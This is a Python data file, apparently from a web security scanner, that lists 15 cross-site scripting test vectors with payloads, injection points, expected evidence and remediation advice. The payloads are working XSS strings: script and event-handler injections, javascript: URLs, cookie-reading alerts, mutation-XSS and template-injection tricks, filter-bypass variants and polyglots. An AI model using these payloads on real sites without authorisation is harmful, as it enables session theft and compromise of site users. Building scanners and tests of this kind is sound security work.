"""
Cross-Site Scripting (XSS) Testing Vectors
Reflected, Stored, DOM-based, and bypass techniques
"""

from ..models import (
    TestVector, VulnerabilityType, TestVectorPosition as Position, PositionType,
    TestVectorPayload as PayloadTemplate, TestVectorEvidence as Evidence, 
    ConfidenceLevel, SensitivityLevel
)

XSS_VECTORS = [
    TestVector(
        id="xss-reflected-001",
        name="Reflected XSS - Basic Alert",
        description="Basic reflected XSS with script tags",
        vuln_type=VulnerabilityType.XSS,
        position=Position(type=PositionType.QUERY, name="search", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="<script>alert(1)</script>",
            variants=[
                "<script>alert(1)</script>",
                "<script>alert('XSS')</script>",
                "<script>alert(document.domain)</script>",
                "<script>alert(document.cookie)</script>"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Script tag in response", "JavaScript executed", "Alert displayed"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Encode user input in HTML context. Use Content-Security-Policy. Implement output encoding.",
        references=["https://owasp.org/www-community/attacks/xss/"],
        tags=["xss", "reflected", "basic"]
    ),
    
    TestVector(
        id="xss-img-001",
        name="XSS via IMG Tag",
        description="XSS using image tag with onerror event",
        vuln_type=VulnerabilityType.XSS,
        position=Position(type=PositionType.QUERY, name="q", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='<img src=x onerror=alert(1)>',
            variants=[
                '<img src=x onerror=alert(1)>',
                '<img src=x onerror="alert(1)">',
                '<img src=x onerror=prompt(1)>',
                '<img src=x onerror=confirm(1)>',
                '<img/src=x/onerror=alert(1)>'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Img tag in response", "Onerror event fired", "JavaScript executed"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Sanitize HTML attributes. Use CSP. Encode special characters.",
        references=["https://portswigger.net/web-security/cross-site-scripting"],
        tags=["xss", "img-tag", "event-handler"]
    ),
    
    TestVector(
        id="xss-svg-001",
        name="XSS via SVG Tag",
        description="XSS using SVG with onload event",
        vuln_type=VulnerabilityType.XSS,
        position=Position(type=PositionType.BODY_JSON, name="comment", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='<svg onload=alert(1)>',
            variants=[
                '<svg onload=alert(1)>',
                '<svg/onload=alert(1)>',
                '<svg><script>alert(1)</script></svg>',
                '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["SVG tag rendered", "Onload executed", "Alert displayed"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Sanitize SVG content. Block SVG uploads or serve with attachment. Use CSP.",
        references=["https://owasp.org/www-community/attacks/xss/"],
        tags=["xss", "svg", "vector-graphics"]
    ),
    
    TestVector(
        id="xss-dom-001",
        name="DOM-Based XSS",
        description="DOM-based XSS via URL fragment",
        vuln_type=VulnerabilityType.XSS,
        position=Position(type=PositionType.PATH, name="fragment", value_prefix="#", value_suffix=""),
        payload=PayloadTemplate(
            base='<img src=x onerror=alert(1)>',
            variants=[
                '<img src=x onerror=alert(1)>',
                '<script>alert(1)</script>',
                'javascript:alert(1)',
                '<svg/onload=alert(1)>'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["DOM manipulation", "Client-side execution", "No server reflection"],
            confidence=ConfidenceLevel.MEDIUM
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Sanitize DOM operations. Avoid innerHTML with user data. Use textContent.",
        references=["https://portswigger.net/web-security/cross-site-scripting/dom-based"],
        tags=["xss", "dom-based", "client-side"]
    ),
    
    TestVector(
        id="xss-attr-001",
        name="XSS in HTML Attribute",
        description="XSS via attribute injection",
        vuln_type=VulnerabilityType.XSS,
        position=Position(type=PositionType.QUERY, name="name", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='" onload="alert(1)',
            variants=[
                '" onload="alert(1)',
                "' onload='alert(1)",
                '" autofocus onfocus="alert(1)',
                "' onclick='alert(1)",
                '" onmouseover="alert(1)'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Attribute injection", "Event handler added", "JavaScript executed"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Encode attributes properly. Use attribute encoding. Validate input.",
        references=["https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"],
        tags=["xss", "attribute-injection", "event-handler"]
    ),
    
    TestVector(
        id="xss-javascript-001",
        name="XSS in JavaScript Context",
        description="XSS when input is inside JavaScript code",
        vuln_type=VulnerabilityType.XSS,
        position=Position(type=PositionType.QUERY, name="callback", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="';alert(1);//",
            variants=[
                "';alert(1);//",
                '";alert(1);//',
                "'-alert(1)-'",
                '";alert(String.fromCharCode(88,83,83));//'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["JavaScript context break", "Alert executed", "Code injection"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Use JSON encoding. Escape JavaScript strings properly. Avoid inline JavaScript.",
        references=["https://owasp.org/www-community/attacks/xss/"],
        tags=["xss", "javascript-context", "context-break"]
    ),
    
    TestVector(
        id="xss-filter-bypass-001",
        name="XSS Filter Bypass - Case Variation",
        description="XSS bypassing filters using case variation",
        vuln_type=VulnerabilityType.XSS,
        position=Position(type=PositionType.QUERY, name="q", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="<ScRiPt>alert(1)</sCrIpT>",
            variants=[
                "<ScRiPt>alert(1)</sCrIpT>",
                "<SCRIPT>alert(1)</SCRIPT>",
                "<sCrIpT>alert(1)</ScRiPt>",
                "<img SRC=x onerror=alert(1)>"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Filter bypassed", "Mixed case accepted", "Script executed"],
            confidence=ConfidenceLevel.MEDIUM
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        remediation="Use proper HTML sanitization libraries. Don't rely on blacklists.",
        references=["https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html"],
        tags=["xss", "filter-bypass", "case-variation"]
    ),
    
    TestVector(
        id="xss-encoded-001",
        name="XSS with HTML Entity Encoding",
        description="XSS using HTML entity encoding",
        vuln_type=VulnerabilityType.XSS,
        position=Position(type=PositionType.QUERY, name="data", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="&lt;script&gt;alert(1)&lt;/script&gt;",
            variants=[
                "&lt;script&gt;alert(1)&lt;/script&gt;",
                "&#60;script&#62;alert(1)&#60;/script&#62;",
                "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
                "&lt;img src=x onerror=alert(1)&gt;"
            ],
            encoding="html"
        ),
        expected_evidence=Evidence(
            indicators=["HTML entities decoded", "Script executed", "Double decoding"],
            confidence=ConfidenceLevel.MEDIUM
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        remediation="Encode output context-appropriately. Avoid double decoding.",
        references=["https://owasp.org/www-community/attacks/xss/"],
        tags=["xss", "encoding", "html-entities"]
    ),
    
    TestVector(
        id="xss-url-001",
        name="XSS via JavaScript URL",
        description="XSS using javascript: protocol",
        vuln_type=VulnerabilityType.XSS,
        position=Position(type=PositionType.BODY_JSON, name="url", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="javascript:alert(1)",
            variants=[
                "javascript:alert(1)",
                "javascript:alert(document.cookie)",
                "javascript:eval('alert(1)')",
                "javascript:void(alert(1))",
                "JaVaScRiPt:alert(1)"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["JavaScript protocol executed", "Alert displayed", "Href injection"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Validate URLs against allowlist. Block javascript: protocol. Use CSP.",
        references=["https://portswigger.net/web-security/cross-site-scripting"],
        tags=["xss", "javascript-protocol", "url-injection"]
    ),
    
    TestVector(
        id="xss-mutation-001",
        name="Mutation XSS (mXSS)",
        description="XSS via HTML mutation during parsing",
        vuln_type=VulnerabilityType.XSS,
        position=Position(type=PositionType.BODY_JSON, name="html", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
            variants=[
                '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
                '<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>',
                '<listing><img src=x onerror=alert(1)></listing>'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Mutation during parsing", "Sanitizer bypassed", "Script executed"],
            confidence=ConfidenceLevel.MEDIUM
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Use well-tested sanitization libraries. Keep libraries updated. Test edge cases.",
        references=["https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/"],
        tags=["xss", "mutation-xss", "mxss", "parser-differential"]
    ),
    
    TestVector(
        id="xss-stored-001",
        name="Stored XSS",
        description="Persistent XSS stored in database",
        vuln_type=VulnerabilityType.XSS,
        position=Position(type=PositionType.BODY_JSON, name="comment", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='<script>alert(document.cookie)</script>',
            variants=[
                '<script>alert(document.cookie)</script>',
                '<img src=x onerror=alert(document.cookie)>',
                '<svg/onload=alert(document.cookie)>',
                '<body onload=alert(document.cookie)>'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Payload stored in database", "Executes for all users", "Persistent XSS"],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Sanitize input before storage. Encode output on display. Use CSP.",
        references=["https://owasp.org/www-community/attacks/xss/"],
        tags=["xss", "stored", "persistent"]
    ),
    
    TestVector(
        id="xss-polyglot-001",
        name="XSS Polyglot Payload",
        description="Universal XSS payload working in multiple contexts",
        vuln_type=VulnerabilityType.XSS,
        position=Position(type=PositionType.QUERY, name="input", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
            variants=[
                'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
                '\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(document.cookie)</script>">\'><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>\'">'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Works in multiple contexts", "Bypasses filters", "Universal payload"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Use context-aware output encoding. Implement strict CSP. Use sanitization libraries.",
        references=["https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot"],
        tags=["xss", "polyglot", "universal"]
    ),
    
    TestVector(
        id="xss-template-001",
        name="XSS via Template Injection",
        description="XSS through client-side template engines",
        vuln_type=VulnerabilityType.XSS,
        position=Position(type=PositionType.QUERY, name="name", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="{{constructor.constructor('alert(1)')()}}",
            variants=[
                "{{constructor.constructor('alert(1)')()}}",
                "{{$on.constructor('alert(1)')()}}",
                "{{7*7}}{{constructor.constructor('alert(1)')()}}",
                "${alert(1)}"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Template expression evaluated", "Code execution", "Angular/Vue/React exploit"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Sanitize template expressions. Use safe template compilation. Implement CSP.",
        references=["https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs"],
        tags=["xss", "template-injection", "client-side"]
    ),
    
    TestVector(
        id="xss-iframe-001",
        name="XSS via Iframe Injection",
        description="XSS using iframe with malicious source",
        vuln_type=VulnerabilityType.XSS,
        position=Position(type=PositionType.QUERY, name="url", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='<iframe src="javascript:alert(1)">',
            variants=[
                '<iframe src="javascript:alert(1)">',
                '<iframe src="data:text/html,<script>alert(1)</script>">',
                '<iframe srcdoc="<script>alert(1)</script>">',
                '<iframe src=x onload=alert(1)>'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Iframe injected", "Malicious content loaded", "JavaScript executed"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Sanitize iframe sources. Use CSP frame-src. Validate URLs.",
        references=["https://owasp.org/www-community/attacks/xss/"],
        tags=["xss", "iframe", "frame-injection"]
    ),
    
    TestVector(
        id="xss-css-001",
        name="XSS via CSS Injection",
        description="XSS through CSS expression or import",
        vuln_type=VulnerabilityType.XSS,
        position=Position(type=PositionType.BODY_JSON, name="style", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='<style>@import"javascript:alert(1)";</style>',
            variants=[
                '<style>@import"javascript:alert(1)";</style>',
                '<style>body{background:url("javascript:alert(1)")}</style>',
                '<style>*{x:expression(alert(1))}</style>',
                '<link rel="stylesheet" href="javascript:alert(1)">'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["CSS injection", "JavaScript executed via CSS", "Expression evaluated"],
            confidence=ConfidenceLevel.MEDIUM
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        remediation="Sanitize CSS input. Block dangerous CSS properties. Use CSP style-src.",
        references=["https://portswigger.net/web-security/cross-site-scripting"],
        tags=["xss", "css-injection", "style"]
    ),
]

# Total vectors: 15
